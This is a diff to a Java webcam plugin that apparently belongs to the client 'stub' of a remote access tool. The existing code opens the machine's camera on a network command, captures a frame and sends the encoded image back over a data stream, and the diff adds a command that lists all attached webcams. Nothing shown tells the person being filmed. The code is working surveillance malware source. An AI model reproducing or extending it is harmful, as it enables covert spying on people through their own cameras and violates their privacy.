@@ -5,6 +5,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.util.Iterator;
+import java.util.List;
 
 import javax.imageio.IIOImage;
 import javax.imageio.ImageIO;
@@ -19,22 +20,23 @@ import com.github.sarxos.webcam.Webcam;
 public class WebcamPlugin extends StubPlugin {
 
 	public static final byte HEADER = 120;
+	public static final byte LIST_WEBCAM_HEADER = 121;
 
 	public static DataInputStream dis;
 	public static DataOutputStream dos;
 	public static boolean enabled;
 	public static Webcam cam;
-	
+
 	static {
 		try {
-			cam = com.github.sarxos.webcam.Webcam.getDefault();
+			cam = Webcam.getDefault();
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
 	}
 
 	public void onEnable() throws Exception {
-		
+
 	}
 
 	public void onDisconnect(Exception ex) {
@@ -51,19 +53,19 @@ public class WebcamPlugin extends StubPlugin {
 	public void onPacket(byte header) throws Exception {
 		if (header == HEADER) {
 			enabled = dis.readBoolean();
-			
+
 			if (enabled) {
 				dos.writeByte(header);
 
-				try {											
+				try {
 					if (!cam.isOpen()) {
 						cam.open();
 					}
-					
+
 					String line = cam.getName();
 					dos.writeShort(line.length());
 					dos.writeChars(line);
-					
+
 					BufferedImage image = cam.getImage();
 
 					ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -76,9 +78,9 @@ public class WebcamPlugin extends StubPlugin {
 					imgwriter.setOutput(ios);
 					imgwriter.write(null, new IIOImage(image, null, null), imgwriterp);
 					imgwriter.dispose();
-					
+
 					byte[] buffer = baos.toByteArray();
-					
+
 					System.out.println(image.getWidth() + " " + image.getHeight());
 
 					dos.writeInt(buffer.length);
@@ -87,7 +89,7 @@ public class WebcamPlugin extends StubPlugin {
 					ex.printStackTrace();
 					String line = "DISABLED";
 					dos.writeShort(line.length());
-					dos.writeChars(line);			
+					dos.writeChars(line);
 				}
 			} else {
 				if (cam != null) {
@@ -95,6 +97,23 @@ public class WebcamPlugin extends StubPlugin {
 				}
 			}
 
+		} else if (header == LIST_WEBCAM_HEADER) {
+			try {
+				List<Webcam> webcams = Webcam.getWebcams();
+				
+				dos.writeByte(LIST_WEBCAM_HEADER);
+
+				dos.writeInt(webcams.size());
+				System.out.println(webcams.size());
+				
+				for (Webcam webcam : webcams) {
+					writeString(webcam.getName());
+				}
+			} catch (Exception ex) {
+				ex.printStackTrace();
+				dos.writeInt(0);
+				System.out.println("FAILED");
+			}
 		}
 	}
 
@@ -115,6 +134,11 @@ public class WebcamPlugin extends StubPlugin {
 
 		return str;
 	}
+	
+	public static synchronized void writeString(String s) throws Exception {
+		dos.writeShort(s.length());
+		dos.writeChars(s);
+	}
 
 	@Override
 	public String getName() {
@@ -123,6 +147,6 @@ public class WebcamPlugin extends StubPlugin {
 
 	@Override
 	public void onStart() {
-		
+
 	}
 }
